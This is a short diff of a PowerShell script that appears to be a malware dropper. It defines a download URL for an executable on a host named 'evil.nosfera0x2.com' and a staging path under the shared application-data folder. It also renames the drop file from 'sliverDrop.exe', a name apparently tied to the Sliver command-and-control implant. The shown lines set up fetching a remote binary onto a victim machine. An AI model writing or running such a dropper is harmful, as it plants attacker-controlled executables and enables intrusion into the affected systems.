@@ -1,7 +1,7 @@
 # Define the URL and target path
 $url = "http://evil.nosfera0x2.com:8181/88ina.exe"
 $targetDirectory = [System.IO.Path]::Combine([System.Environment]::GetFolderPath('CommonApplicationData'), 'DownloadedFiles')
-$targetFile = [System.IO.Path]::Combine($targetDirectory, 'sliverDrop.exe')
+$targetFile = [System.IO.Path]::Combine($targetDirectory, '88ina.exe')
 
 # Create the target directory if it doesn't exist
 if (-not (Test-Path -Path $targetDirectory -PathType Container)) {
